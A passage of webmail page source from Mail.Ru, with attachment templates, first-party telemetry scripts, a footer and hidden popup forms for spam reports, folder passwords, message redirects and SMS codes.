|| file.ext == "rtf" ||file.ext == "xls" || file.ext == "xlsx" || file.ext == "xlsb" || file.ext == "xlsm" || file.ext == "csv" ||file.ext == "ppt" || file.ext == "pptx" || file.ext == "pps" || file.ext == "ppsx"){ %><span class="js-viewWebApp mr10"><a class="downloadlink js-link" target="_blank" href="<%=file.attachPreviewUrl%>">Посмотреть</a></span><% } %><% } %><% if( file.messageReadUrl ){ %><a href="<%=file.messageReadUrl%>" class="mr10" target="_blank">Прочитать</a><% } %><a href="<%=file.downloadUrl%>" class="js-clickable js-download mr10">Скачать</a><% if (file.availableEditing) { %><a href="#" data-type="<%= file.type %>" class="js-editAttachedFile mr10">Редактировать</a><% } %><% if( patron.EnableAttachToCloud ){ %><a href="#" data-id="<%= file.PartID %>" data-tnef-id="<%=file.tnef_id%>" data-filename="<%= file.name %>" class="js-attachToCloud mr10"><% if( patron.v2 ){ %><i class="filesearch__icon ico ico_attachviewer_attach-to-cloud"></i><% } else { %><i class="icon icon_attach-to-cloud"></i><% } %>В Облако</a><% } %><% if( 0 && file.addPhotoUrl ){ %><a class="js-inAlbum mr10" href="<%=file.addPhotoUrl%>" target="_blank">В&nbsp;фотоальбом</a><% } %></div><% if( file.hasAttach ){ %><br />Файлы, вложенные в winmail.dat:<br /><% } %><% if( file.defaultPreviewUrl ){ %><a href="<%=file.attachPreviewUrl%>" class="attachment__preview js-link" target="_blank"><img class="js-previewImg" src="<%=file.defaultPreviewUrl%>" onerror="this.parentNode.style.display='none'"/></a><% } %><% if( file.ContentText && file.ContentText.trim().length ){ %><span class="addPh1 dB js-previewText"><span class="addPh2 dB"><span class="addPh3 dB oH p0"><span class="fade" style="height: 100%; left: 100%;">&nbsp;</span><span class="attachment__content-text p5 t12 dB"><%=file.ContentText%></span><% if( file.ContentTextLen ){ %><span class="dIB w pt2 pr5 pb3 pl5 mt5" style="background-color: #CCCCCC;">Показано <%=file.ContentTextLen%> байт из <%=String.sizeFormat(file.size)%> &nbsp; <a href="<%=file.attachPreviewUrl%>" class="w js-link" target="_blank">Смотреть полностью</a></span><% } %></span></span></span><% } %></div></div><% } %><% } %></div>
			<% } %>

			<% if( Attachlinks.length ){ %>
				<div class="attachlist__header">
					<div class="attachlist__header__count">К письму прикреплены ссылки на файлы: <%=Attachlinks.length%></div>
					<% for( var i = 0, n = Attachlinks.length, file; i < n; i++ ){ file = Attachlinks[i];  %>
						<div class="pb10 pt10 filesShow">

							<% if( AvStatusBar && file.avstatus == "infected" ){ %>
								<span class="file-icon file-icon_attach-list file-icon_type_<%=file.iconType%>"></span>
							<% } else { %>
								<a href="<%= (file.cloud ? '//cloud.mail.ru' : '') + file.downloadlink %>" class="file-icon file-icon_attach-list file-icon_type_<%=file.iconType%>" target="_blank"></a>
							<% } %>

							<div class="ml15 ohd"><span class="fade" style="left: 100%;">&nbsp;</span>
								<% if( AvStatusBar && file.avstatus == "infected" ){ %>
									<div class="grey2"><strong><%=file.name%></strong></div>
									<div class="attachment__antivirus__avstatus attachment__antivirus__avstatus_infected">
										Этот файл содержит вирусы, поэтому не доступен для скачивания
									</div>
								<% } else { %>
									<a href="<%= (file.cloud ? '//cloud.mail.ru' : '') + file.downloadlink %>" class="bold" target="_blank"><%=file.name%></a>
									<div class="grey2 t11 mt7>"><%=String.sizeFormat(file.size)%> &nbsp;<a class="downloadlink" href="<%= (file.cloud ? '//cloud.mail.ru' : '') + file.downloadlink %>">Скачать</a><% if (file.duedate) { %> (ссылка доступна до <%=file.duedate%>)<% } %></div>
								<% } %>
							</div>
						</div>
					<% } %>
				</div>
			<% } %>
		</div>
	<% } %>

	<% if( Winmail_name ){ %>
		<div class="mr_read__attach">
			<div class="mr10">
			<% var urlActionAttach; %><% urlActionAttach = "//"+MainMailHost +"/cgi-bin/getattach?x-email=" + encodeURIComponent(mailru.useremail) + "&file="+ Winmail_URLFileName +"&id="+ Winmail_PartID +"&mode=attachment&channel="+ Winmail_Channel +""; %>
			<div class="pt10 pl0 filesShow" style="color:#333 !important;">Письмо содержит служебные данные Microsoft Outlook. <a href="<%=urlActionAttach%>">Скачать winmail.dat</a></div>
		</div>
		</div>
	<% } %>
</div>
</script>
<script id="tpl-Attach" type="text/plain"><div class="{{classes}}" data-key="{{key}}"><!-- for final class = filesHide -->
	<{{tag}} href="{{href}}" class="i-spI i-{{icon}}" target="_blank"></{{tag}}>
	<div class="ohd"><div class="mb7"><span class="fade" style="left: 100%;">&nbsp;</span><{{tag}} href="{{href}}" class="filesName {{color}}"><span class="name attachviewer__viewer__name__filename">{{name}}</span><span class="attachviewer__viewer__name__filetype">{{ext}}</span></{{tag}}></div>
		<div class="sub"></div>
	</div>
	{{size}}{{links}}
</div></script>




					
					<script>__domTS('body')</script>

					<div class="minwidth">
						
						


	



	
	




<script>__domTS('foot')</script>
<div class="footer footer_portal-footer">
<a style="display: none;" href="#" class="footer__theme-link" id="ThemeFooterLink"></a>
	<div class="footer__theme-widget" id="ThemeFooterWidget" style="display: none;"></div>
</div>


<script>__domTS('foot')('foot__js')</script>
 <script type="text/javascript">
	patron.tokens['themes'] = window['mailru_api_token_parts'];

	

	

	

	

	
	
</script>



<br style="display:none">
<style id="trg-style">
.trg-b-mail div.leftcol {
     border: 0px;
     background: transparent;
     padding-top: 0px;
     padding-bottom: 0px;
}
.trg-b-mail div.leftcol__sep {
     padding-bottom: 0px;
}
div.trg-b-banner-block {
	font-family: Arial, Helvetica, Sans-serif;
	font-size: 12px;
    line-height: 16px;
	position: relative;
    display: block;
    overflow: hidden;
	padding: 0 0 0 0;
	text-align: center;
}
.trg-b-banner-block ul.trg-b-list {
	font-size: 12px;
    margin: 0;
	list-style: none;
	text-align: left;
    color: #333;
}
.trg-b-mail ul.trg-b-list {
    padding: 0px 15px 0 15px;
}
.trg-b-banner-block li.trg-b-banner {
    overflow: hidden;
}
.trg-b-mail li.trg-b-banner {
	padding: 6px 0 11px 0;
}
.trg-b-mail li.trg-b-banner_last {
    border: none;
}
.trg-b-banner-block a.trg-b-all-in-link, .trg-b-mail a.trg-b-all-in-link:hover {
	text-decoration: none;
}
.trg-b-banner-block a.trg-b-all-in-link {
    display: block;
    overflow: hidden;
}
.trg-b-mail img.trg-b-img {
    float: left;
    width: 90px;
    margin: 1px -100% 0 0;
	padding: 0px 0 0px 0px;
    cursor: pointer;
}
.trg-b-mail span.trg-b-animate {
    float: left;
    width: 60px;
    margin: 1px -100% 5px 5px;
	padding: 0px 0 0px 0px;
    cursor: pointer;
}
.trg-b-banner-block .trg-b-header {
	font-size: 14px;
	line-height: 1.2;
    display: inline;
    white-space: normal;
}
.trg-b-banner-block a.trg-b-header:hover {
    background-color: transparent;
}
.trg-b-mail .trg-b-header {
    font-weight: bold !important;
    margin: 0px 0 6px 0;
    padding: 0;
    text-decoration: underline;
}
.trg-b-mail .trg-b-header:hover {
    text-decoration: underline;
}
.trg-b-banner-block span.trg-b-text {
	display: block;
	cursor: pointer;
	font-size: 12px;
    line-height: 1.2;
}
.trg-b-mail span.trg-b-text {
    padding: 0 0 0 98px;
    margin: 0 0 2px;
    width: 112px;
}
.trg-b-mail span.trg-b-text:hover {
    text-decoration: underline;
}
.trg-b-mail .trg-b-disclaimer {
	line-height: 10px;
    clear: both;
/*	cursor: pointer;
	padding: 2px 0 0;*/
}
.trg-b-banner-block .trg-b-disclaimer-star {
	line-height: 16px;
	font-size: 13px;
	float: left;
	padding: 0 2px 0 0;
    color: red;
}
.trg-b-banner-block span.trg-b-disclaimer-text {
	font-size: 11px;
}
.trg-b-banner-block img.trg-hidden-img {
	position: absolute;
    width: 1px;
	height: 1px;
}

.trg-b-banner-block a.trg-b-contact-us-img {
    position: absolute;
    left: 15px;
    top: 15px;
    height: 16px;
    width: 108px;
    z-index: 1;
    background: url(https://r.mradx.net/img/B1/7ED3CB.png) 0 0 no-repeat;
}
.trg-b-banner-block a.trg-b-contact-us-img:hover {

}
.trg-b-mail a.trg-b-footer {
	font-size: 12px;
    white-space: normal;
}
.trg-b-mail a.trg-b-footer:hover {
	color: #000;
}
.trg-b-banner-block a.trg-b-contact-us-link {
    font-size: 12px;
    line-height: 14px;
    display: block;
    padding: 0 0 0 15px;
    text-align: left;
    margin: 3px 0 6px;
}
.trg-b-mail span.trg-b-text-wrap {
    padding: 0;
}
.trg-b-header-wrapper {
    display: block;
    margin: 0 0 5px;
}
.trg-b-age-limit {
    font-family: Arial, Verdana, san-serif;
    font-size: 10px;
    line-height: 14px;
    vertical-align: middle;
    text-align: center;
    margin: 0 0 0 2px;
    padding: 0 1px;
    display: inline;
    border: 1px solid #B3B3B3;
    border-radius: 1px;
    color: #666666;
}
.trg-b-domen {
  line-height: 13px;
  font-size: 11px;
}
.trg-b-domen_bottom {
  padding-top: 4px;
  clear: both;
  width: 100%;
}
.trg-b-domen:hover {
  text-decoration: underline;
}
</style>

































<script>__log.foot__js = 0;</script>
<script type="text/javascript">
	require('patron.v2/env/scroll', function ($ScrollElement) {
		$ScrollElement.restoreScrollEl();
	});

	patron.radar('themes', 'active', patron.currentTheme);
	
		patron.HTMLCompose = 1;
	

	
		patron.newMultiAuthLogic = 1;
	

	if( window.__PH && typeof __PH.isAuthFormEnabled === "function" && __PH.isAuthFormEnabled() ) {
		patron.phAuthFormEnabled = true;//MAIL-15077
	}

	
		
	

	
	jsCookie.set('gmt', -(new Date).getTimezoneOffset()/60, jsCookie.YEAR);


	(function (factory){
		var requires = [];
		requires.push('patron/patron');
		requires.push('patron.build/core');
		
		require(requires, function (init) {
			jQuery(function ($) {
				init($);
				factory($);
			});
		});
	})(function ($) {
		
			
			(function (layout, col1, col2, col3, threeCols, prevColXHeight, currentColXHeight, intervalId, timeoutId) {
				function _updateHeight() {
					currentColXHeight = threeCols ? Math.max(col3.offsetHeight, col1.offsetHeight) : col1.offsetHeight;
					if (prevColXHeight !== currentColXHeight) {
						col2.style.minHeight = (prevColXHeight = currentColXHeight) + 'px';
						_triggerScrollEvent();
					}
				}
				function _stopInterval() {
					clearInterval(intervalId);
				}
				function _stopTimeout() {
					clearTimeout(timeoutId);
				}
				
				function _triggerScrollEvent() {
					var footerEvent,
						scrollBody;

					if ((scrollBody = document.getElementById('ScrollBody')) && 'createEvent' in document && 'dispatchEvent' in scrollBody) {
						try {
							footerEvent = document.createEvent('Event');
							footerEvent.initEvent('scroll');
							scrollBody.dispatchEvent(footerEvent);
						} catch( err ){
							ajs.log(err);
						}
					}
				}

				function _start () {
					_updateHeight(); _stopTimeout(); _stopInterval();
					intervalId = setInterval(_updateHeight, 100);
					timeoutId = setTimeout(_stopInterval, 10000);
				}

				$(window).bind('updateleftcolheight', function () {
					layout = layout || $('#LEGO').children('.b-layout');
					threeCols = threeCols || layout.attr('data-cols') === '3';

					if (layout && layout[0]) {
						if (threeCols) {
							col1 = col1 || layout.children('.b-layout__col_1_3')[0];
							col2 = col2 || layout.children('.b-layout__col_2_3')[0];
							col3 = col3 || layout.children('.b-layout__col_3_3')[0];
							if (col1 && col2 && col3) {
								_start();
							}
						} else {
							col1 = col1 || layout.children('.b-layout__col_1_2')[0];
							col2 = col2 || layout.children('.b-layout__col_2_2')[0];
							if (col1 && col2) {
								_start();
							}
						}
					}
				}.debounce(30));

				
					$(window).triggerHandler('updateleftcolheight');
				


			})();
		

		

		
			require(['patron/patron.Balloon'], function () {
				patron.Balloon.redraw();
			});

			
		

		$('#FooterLangSwitcher').click(function (evt) {
			require(['plugins/LayerManager'], function () {
				LayerManager.show('changeLang', {modifyprofile : ''});
			});
			evt.preventDefault();
		});

		

		require(['patron/patron.BindedCounters'], function () {
			$(window).triggerHandler('themePageLoad.themes', [patron.currentTheme]);
			$(window).triggerHandler('langPageLoad.lang', [patron.LANG]);

			
		});

		

		

		
		
		

		if (window.performance){
			var timing = window.performance.timing, memory = window.performance.memory;

			if (timing){
				if (timing.connectStart && timing.connectEnd){
					patron.radar('Time_connect', timing.connectEnd-timing.connectStart);
				}
				if (timing.domainLookupStart && timing.domainLookupEnd){
					patron.radar('Time_domainLookup', timing.domainLookupEnd-timing.domainLookupStart);
				}
				if (((timing.domainLookupEnd || 0) - (timing.domainLookupStart || 0)) > 0){
					patron.radar('Time_dl_nonil', timing.domainLookupEnd-timing.domainLookupStart);
				}
				if (timing.requestStart && timing.responseStart){
					patron.radar('Time_request', timing.responseStart-timing.requestStart);
				}
				if (timing.responseStart && timing.responseEnd){
					patron.radar('Time_response', timing.responseEnd-timing.responseStart);
				}
				
				if (timing.secureConnectionStart && timing.connectEnd){
					patron.radar('Time_sconn', timing.connectEnd - timing.secureConnectionStart);
				}
				if (timing.connectEnd && timing.secureConnectionStart && (timing.connectEnd - timing.secureConnectionStart > 0)){
					patron.radar('Time_sconn_nonil', timing.connectEnd - timing.secureConnectionStart);
				}
				
			}

			if (memory && memory.usedJSHeapSize){
				(function (){
					var
						  MB = Math.MB
						, min = 60*1000
						, hour = 60 * min
						, round = Math.round
					;

					var sendMemoryStat = function (interval){
						var stat = {};
						stat['usage_'+interval] = round(memory.usedJSHeapSize/MB);
						stat['total_'+interval] = round(memory.totalJSHeapSize/MB);
						patron.radar('v2memory', stat, round(memory.jsHeapSizeLimit/MB));
					};

					setTimeout(function (){ sendMemoryStat('5m'); },  5*min);
					setTimeout(function (){ sendMemoryStat('10m'); }, 10*min);
					setTimeout(function (){ sendMemoryStat('15m'); }, 15*min);
					setTimeout(function (){ sendMemoryStat('30m'); }, 30*min);

					setTimeout(function (){ sendMemoryStat('1h'); },  1*hour);
					setTimeout(function (){ sendMemoryStat('3h'); },  3*hour);
					setTimeout(function (){ sendMemoryStat('6h'); },  6*hour);
					setTimeout(function (){ sendMemoryStat('12h'); }, 12*hour);
					setTimeout(function (){ sendMemoryStat('24h'); }, 24*hour);
					setTimeout(function (){ sendMemoryStat('48h'); }, 48*hour);

					sendMemoryStat('0m');
				})();
			}
		}

		
		
		var testFrame = document.createElement("iframe")
		  , text =
				"<body style='font-size:100%'>\
					<div id=test style='min-height:1em;height:1em;max-height:1em;overflow:hidden;padding:0;margin:0;border:0;display:block'><\/div>\
					<script>(function(global){\
						var t=document.getElementById('test')||{},m=global.parent['patron'],c;\
						if(!m||!m['radar'])return;\
						c=t.offsetHeight||0;\
						if(c-C_CALIBRATING_FONT_SIZE-2>0){\
						m['radar']('fontsize',c+'px=1',1);\
						}\
					})(this)<\/script>\
				<\/body>"
						.replace("C_CALIBRATING_FONT_SIZE", 16)
		  , succ = false
		;

		function killFrame() {
			text = void 0;
			testFrame.src = "about:blank";
			document.body.removeChild(testFrame);
			testFrame = null;
		}

		testFrame.style.position = "absolute";
		testFrame.style.top = "-9999px";
		testFrame.style.visibility = "hidden";
		testFrame.src = "about:blank";
		document.body.appendChild(testFrame);

		try{
			testFrame.contentWindow.document.write(text);
			succ = true;
		}
		catch(e){
				try {
				testFrame.src = "javascript:(function(){document.write('" + text + "')})()";
					succ = true;
				}
				catch (e){}
			}

		if(succ) {
			setTimeout(killFrame, 500);
		}
		else {
			killFrame();
		}
		
		

		
		

		

		

		

		

		
	});

	


	
		(function _tryAgain(){
			var build = patron.build.split('.');
			if( build.length == 2 ){
				patron.radar('deploy_'+build[0], build[1]+'=1');
				if (patron.KaktamBuildEnabled) {
					patron.gstat({ log: 'initial_deploy_'+build[0], build: build.join('.') });
				}
			} else {
				patron.radar('deploy_fail', 'init=1', 1);
				if (patron.KaktamBuildEnabled) {
					patron.gstat({ log: 'initial_deploy_fail', build: build.join('.') });
				}
			}

			
		})();
	


	


	


	

	__log.foot__js = 1;
</script>











<script>
	window.__log && (function (){
		var key, ok = [], fail = [];

		for( key in __log ){
			(__log[key] ? ok : fail).push(key+':1');
		}

		if( ok.length ){
			(new Image).src = '//stat.radar.imgsmail.ru/update?email=&p=mail&t=jsLogOK&v=1&i='+ ok.join(',') +'&rnd='+ Math.random();
		}

		if( fail.length ){
			(new Image).src = '//stat.radar.imgsmail.ru/update?email=&p=mail&t=jsLogFAIL&v=1&i='+ fail.join(',') +'&rnd='+ Math.random();
		}


		(new Image).src = '//rs.mail.ru/d2775743.gif?rnd=' + Math.random();

		if( 'core_file_js' in __log ){
			(new Image).src = '//rs.mail.ru/'+(__log.core_file_js ? 'sb' : 'd')+'2775738.gif?rnd=' + Math.random();
		}

		if( __log.core_js ){
			(new Image).src = '//rs.mail.ru/sb2775743.gif?rnd=' + Math.random();
		}
	})();

	
</script>








<script>
	require([
		'patron.v2/models/Folder',
		'jquery',
		'patron.v2.utils/patron.utils.ui.counters'
	], function (Folder) {
		/** @tasks MAIL-38725, MAIL-42069 */
		Folder.all.on('change', function (event, model) {
			if (model.get('messages_unread') < 0) {
				$.event.trigger('ui-abstract-action', {
					chain: ['folders', 'negative_unread_messages']
				});
			}
		});
	});
</script>


<script>__domTS('foot__js')</script>





						
					</div>

			</div>
			
	

	
		
		
		

		
		
		
		

		

		

		<div id="footer__portal" style="">

			<div class="minwidth">
				
			</div>

			<div class="minwidth">
				<img src="https://rs.mail.ru/d990518.gif?sz=1&amp;rnd=147127497&amp;ts=1443445249&amp;sz=1" style="width:0;height:0;position:absolute;visibility:hidden;" alt="">








	





<style>.portal-footer{position:relative;margin:0;white-space:nowrap;text-align:left;background:#fff;*zoom:1;width:100%;height:28px;margin:0;padding:0;border:0;border-top:1px solid #D5D5D5;border-spacing:0;border-collapse:collapse;font-family:Arial, sans-serif;font-size:0;color:#999;border-collapse:collapse;border-spacing:0}.w-portal-footer__visible{position:relative}.portal-footer td,.portal-footer tr{vertical-align:top;text-align:left;border:none;padding:0;margin:0;width:auto;white-space:nowrap}.portal-footer .portal-footer__col_left{width:1%;padding-right:28px;padding-left:10px;text-align:left}.portal-footer .portal-footer__col_right{text-align:right;padding-right:10px}.portal-footer__link{display:inline-block;*display:inline;*zoom:1;margin:0 8px}.portal-footer__link,.portal-footer__link:link,.portal-footer__link:visited,.portal-footer__link:hover,.portal-footer__link:active,.portal-footer__link:focus{outline:0;cursor:pointer;color:#999;font-size:12px;font-family:Arial, sans-serif;height:28px;line-height:28px;*zoom:1}.portal-footer__link,.portal-footer__link:link,.portal-footer__link:visited{text-decoration:none}.portal-footer__link:hover,.portal-footer__link:active,.portal-footer__link:focus{text-decoration:none;color:#f26d00}#portal-footer__project-links__container{display:none;position:absolute;visibility:hidden}.portal-footer__lang-select{font-size:12px;font-family:Arial, sans-serif;margin-left:8px}.portal-footer__lang-select__button,.portal-footer__lang-select__button:link,.portal-footer__lang-select__button:visited,.portal-footer__lang-select__button:hover,.portal-footer__lang-select__button:active,.portal-footer__lang-select__button:focus{text-decoration:none;position:relative;outline:0;font-size:12px;font-family:Arial, sans-serif;cursor:pointer;color:#999;border-bottom:1px dotted #999;margin:0 8px;*border-bottom-style:dashed;border-bottom-style:dashed\9}.portal-footer__lang-select__button:hover,.portal-footer__lang-select__button:active,.portal-footer__lang-select__button:focus{color:#f26d00;border-bottom-color:#f26d00}.portal-footer__project-links{white-space:nowrap}
</style>










<div class="w-portal-footer" id="w-portal-footer" data-visibility-class="w-portal-footer__visible"><table class="portal-footer portal-footer_portal-footer" cellpadding="0" cellspacing="0" border="0"><tbody><tr><td class="portal-footer__col portal-footer__col_left"><div class="portal-footer__portal-links"><!--portal-links--><a class="portal-footer__link" href="https://r.mail.ru/n154506910?sz=1&amp;rnd=147127497" target="_blank"><span class="portal-footer__link__text">Mail.Ru</span></a><a class="portal-footer__link" href="https://r.mail.ru/n103473801?sz=1&amp;rnd=147127497" target="_blank"><span class="portal-footer__link__text">О компании</span></a><a class="portal-footer__link" href="https://r.mail.ru/n154506911?sz=1&amp;rnd=147127497" target="_blank"><span class="portal-footer__link__text">Реклама</span></a><a class="portal-footer__link" href="https://r.mail.ru/n124348197?sz=1&amp;rnd=147127497" target="_blank"><span class="portal-footer__link__text">Вакансии</span></a><!--/ portal-links--></div></td><td class="portal-footer__col portal-footer__col_right"><div id="portal-footer__project-links" class="portal-footer__project-links" data-project-links-class="portal-footer__link"><a class="portal-footer__link" href="//r.mail.ru/n108213065" target="_blank"><span class="portal-footer__link__text">Мобильная почта</span></a><a class="portal-footer__link" href="//r.mail.ru/n108213067"><span class="portal-footer__link__text">Темы</span></a><a class="portal-footer__link" href="//r.mail.ru/n108213072"><span class="portal-footer__link__text">Настройки</span></a><a class="portal-footer__link" href="//r.mail.ru/n108213077" target="_blank"><span class="portal-footer__link__text">Помощь</span></a><a class="portal-footer__link" href="//r.mail.ru/n108213079" target="_blank"><span class="portal-footer__link__text">Служба поддержки</span></a><a class="portal-footer__link" href="//r.mail.ru/n108213082" target="_blank"><span class="portal-footer__link__text">Блог Почты</span></a><span class="portal-footer__lang-select"><span class="portal-footer__lang-select__label">Язык:</span><a href="#" id="FooterLangSwitcher" class="portal-footer__lang-select__button">русский</a></span></div><script>void function(){"use strict";function c(){var c=e.getElementById("portal-footer__project-links"),g=e.getElementById("portal-footer__project-links__insert_before"),f=e.getElementById("portal-footer__project-links__container"),b,h,a,d,k;if(c&&g&&f){h=[];b=f.getElementsByTagName("a");for(d=b.length;d;)a=b[--d],h.push(a);for(;a=h.pop();)(b=a.getAttribute("data-type"))?(d="portal-footer__link portal-footer__link_"+b,k="portal-footer__link__text portal-footer__link__text_"+b):(d="portal-footer__link",k="portal-footer__link__text"),
a.innerHTML='<span class="'+k+'">'+("textContent"in a?a.textContent:"innerText"in a?a.innerText:"data"in a?a.data:"")+"</span>",(b=a.style)&&b.cssText&&(b.cssText=""),a.className=d,c.insertBefore(a,g);c.removeChild(g);f.parentNode.removeChild(f);return!0}}var e=this.document;c()||(e.addEventListener&&e.addEventListener("DOMContentLoaded",c,!1),window.addEventListener?window.addEventListener("load",c,!1):window.attachEvent("onload",c,!1))}.call(window);</script></td></tr></tbody></table></div>
			</div>

		</div>
	

	


			
			<script>
				(function(window, document, jQuery){
					var $themeInner = $('#themeInner')
							, $window = $(window);

					$window.bind('resize', function(event){
						$themeInner.css('min-height', $window.height()-29);
					});
					$window.triggerHandler('resize');
				})(window, document, jQuery);
			</script>
			<div id="MailRuConfirm" class="alertDiv" style="display:none;">
	<div class="popup js-layer popup_dark">
		<a class="popup__close js-cancel confirm-cancel" href="javascript:void(0);">
			<i class="icon icon_popup-close"></i>
		</a>

		<div class="is-spam_in" style="display:none;">
	<form action="">
		<div class="popup__box">
			<div class="popup__head">Пожаловаться на спам</div>
			<div class="popup__desc">
				<div class="popup__desc__parag popup__desc__parag_select">Спасибо за помощь. Перечисленные письма будут переданы для анализа разработчикам антиспам системы:</div>
				<div id="is-spam-txt" class="popup__desc__parag"></div>
				<div class="form__checkbox">
					<label>
						<input value="on" name="delorig" checked="checked" class="form__checkbox__checkbox" type="checkbox">
						<span class="form__checkbox__label">Переместить выбранные письма со спамом в Корзину</span>
					</label>
				</div>
				<div class="form__checkbox">
					<label>
						<input value="on" name="toblacklist" class="form__checkbox__checkbox" type="checkbox">
						<span class="form__checkbox__label">Занести адреса в черный список</span>
					</label>
				</div>
			</div>
		</div>
		<div class="popup__controls">
			
				<button class="btn btn_stylish btn_main confirm-ok" type="submit"><span class="btn__text">Пожаловаться</span></button>
				<button class="btn btn_stylish confirm-cancel" type="button"><span class="btn__text">Отменить</span></button>
			
		</div>
	</form>
</div>

		<div class="is-secure_in" style="display:none;">
	<form action="">
		<div class="popup__box">
			<div class="popup__head popup__head_wrap">
				Введите пароль для доступа к папке «<span id="is-secure-txt">Название папки</span>»
			</div>
			<div class="form__row">
				<div class="form__row__label form__row__label_popup">
					<label for="folder-password">Пароль</label>
				</div>
				<div class="form__row__widget form__row__widget_popup">
					<input class="form__field" value="" id="folder-password" name="pass" type="password">
					<div class="form__message form__message_hidable"></div>
					<div class="form__row__subwidget">
						<a href="#" class="pseudo-link js-password-restore">Забыли пароль?</a>
					</div>
				</div>
			</div>
		</div>
		<div class="popup__controls">
			
				<button class="btn btn_stylish btn_main confirm-ok" type="submit"><span class="btn__text">Войти</span></button>
				<button class="btn btn_stylish confirm-cancel" type="button"><span class="btn__text">Отменить</span></button>
			
		</div>
	</form>
</div>

		<div class="is-secureRestore_in" style="display:none;">
	<form action="">
		<div class="popup__box">
			<div class="popup__head">
				Восстановление пароля к папке «<span id="is-secure-txt">Название папки</span>»
			</div>
			<div class="js-step1">
				<div class="form__row">
					<div class="form__row__label form__row__label_popup">
						<div>Секретный вопрос</div>
					</div>
					<div class="form__row__widget form__row__widget_popup form__row__widget_text">
						<span class="js-question" style="font-size:15px;"></span>
					</div>
				</div>
				<div class="form__row">
					<div class="form__row__label form__row__label_popup">
						<label for="folder-secret-answer">Ответ</label>
					</div>
					<div class="form__row__widget form__row__widget_popup">
						<input class="form__field" value="" id="folder-secret-answer" name="answer" type="text">
						<div class="js-error-container" style="display:none">
							<div class="form__message form__message_hidable form__message_error">
								Ответ не верен.<br>Пожалуйста, введите правильный ответ на секретный вопрос.
							</div>
							<div class="form__row__subwidget">
								Забыли ответ? <a href="#">Обратитесь в службу поддержки</a>
							</div>
						</div>
					</div>
				</div>
			</div>
			<div class="js-step2" style="display:none">
				<div class="js-folder-password-question">
<div class="form__row">
	<div class="form__row__label form__row__label_popup">
		<label for="folder-password">Пароль</label>
	</div>
	<div class="form__row__widget form__row__widget_popup">
		<input class="form__field" value="" id="folder-password" name="secret_password_new" type="password">
		<div class="form__message"></div>
	</div>
</div>
<div class="form__row">
	<div class="form__row__label form__row__label_popup">
		<label for="folder-password2">Повторите пароль</label>
	</div>
	<div class="form__row__widget form__row__widget_popup">
		<input class="form__field" value="" id="folder-password2" name="secret_password_retype" type="password">
		<div class="form__message"></div>
	</div>
</div>
<div class="form__row">
	<div class="form__row__label form__row__label_popup">
		<label for="folder-secret-question">Секретный вопрос</label>
	</div>
	<div class="form__row__widget form__row__widget_popup">
		<input class="form__field" value="" id="folder-secret-question" name="secret_question" autocomplete="off" type="text">
		<div class="form__message"></div>
	</div>
</div>
<div class="form__row">
	<div class="form__row__label form__row__label_popup">
		<label for="folder-secret-answer">Ответ</label>
	</div>
	<div class="form__row__widget form__row__widget_popup">
		<input class="form__field" value="" id="folder-secret-answer" name="secret_answer" autocomplete="off" type="text">
		<div class="form__message"></div>
	</div>
</div>
</div>
<div class="form__row">
	<div class="form__row__label form__row__label_popup">
		<label for="folder-current-password">Текущий пароль от ящика</label>
	</div>
	<div class="form__row__widget form__row__widget_popup">
		<input class="form__field" value="" id="folder-current-password" name="Password" type="password">
		<div class="form__message"></div>
	</div>
</div>
			</div>
		</div>
		<div class="popup__controls">
			
				<button class="btn btn_stylish btn_main confirm-ok" type="submit"><span class="btn__text">Далее</span></button>
				<button class="btn btn_stylish confirm-cancel" type="button"><span class="btn__text">Отменить</span></button>
			
		</div>
	</form>
</div>

		<div class="is-moveto_in" style="display:none;">
	<form action="">
		<div class="popup__box">
			<div class="popup__head">Переместить</div>
			<div class="popup__desc">Вы действительно хотите переместить <span id="is-moveto-txt">N писем</span> в папку «<span id="moveto-folder-name">Название папки</span>»?</div>
		</div>
		<div class="popup__controls">
			
				<button class="btn btn_stylish btn_main confirm-ok" type="submit"><span class="btn__text">Да</span></button>
				<button class="btn btn_stylish confirm-cancel" type="button"><span class="btn__text">Отменить</span></button>
			
		</div>
	</form>
</div>

		<div class="is-redirect_in" style="display:none;">
	<form action="">
		<input value="" name="id" type="hidden">
		<input value="1" name="ab" type="hidden">
		<div class="popup__box">
			<div class="popup__head">Перенаправить письмо</div>
			
			<div class="form__row">
				<div class="form__row__label form__row__label_popup">
					<a href="#" class="js-addressbook">Кому</a>
				</div>
				<div class="form__row__widget form__row__widget_popup mlr-snd_input_expand">
					<input class="form__field form__field_address-list" name="RedirectTo" value="" type="text">
					<div class="clear"></div>
					<div class="ac-layer popup__address-list-suggest"></div>
				</div>
			</div>
				<div class="popup__desc popup__desc_messagebox">
					Перенаправление письма позволит отправить это письмо другому получателю «как есть».<br><br>Чтобы отправить исходное письмо, добавив свои комментарии и сохранив вложения,  воспользуйтесь функцией <a rel="history">пересылки</a>. Можно указывать несколько адресов, разделяя их запятыми.
				</div>
			
		</div>
		<div class="popup__controls">
			
				<button class="btn btn_stylish btn_main confirm-ok" type="submit"><span class="btn__text">Перенаправить</span></button>
				<button class="btn btn_stylish confirm-cancel" type="button"><span class="btn__text">Отменить</span></button>
			
		</div>
	</form>
</div>

		<div class="is-redirect-done_in" style="display:none;">
	<form action="">
		<div class="popup__head">
			<b class="status ok">Письмо перенаправлено</b>
			<b class="status error">Ошибка сервера, попробуйте еще раз</b>
		</div>
		<div class="popup__controls">
			
				<button class="btn btn_stylish btn_main confirm-ok" type="submit"><span class="btn__text">Закрыть окно</span></button>
			
		</div>
	</form>
</div>

		<div class="is-signupsms_in" style="display:none;">
	<form action="" autocomplete="off">
		<div class="popup__box">
			<div class="popup__head">
				Введите код
			</div>

			<div class="popup__desc popup__desc_messagebox mainText"></div>
			<div class="popup__desc popup__desc_messagebox info"></div>

			
			<div class="form__row">
				<div class="form__row__label form__row__label_popup">
					<label for="signupsms_code">Код подтверждения</label>
				</div>
				<div class="form__row__widget">
					<input class="form__field" value="" id="signupsms_code" name="code" autocomplete="off" type="text">
					<div class="js-error form__message form__message_error"></div>
				</div>
			</div>

			<div class="js-resend-container" style="display: none;">
				<div class="form__row__label form__row__label_popup"></div>
				<div class="form__row__widget">
					<a href="#" class="js-resend pseudo-link">Отправить код еще раз</a>
				</div>
			</div>
			

			<div class="js-captcha-container" style="display: none; margin-top: 10px;">
				<div class="form__row">
					<div class="form__row__widget form__row_no-label">
						<img class="js-captcha" src="//img.imgsmail.ru/0.gif" alt="" style="display: block;" height="100" width="180">
					</div>
				</div>
				<div class="form__row form__row_snap-to-top">
					<div class="form__row__label form__row__label_popup">
						<label for="captcha">Укажите код</label>
					</div>
					<div class="form__row__widget">
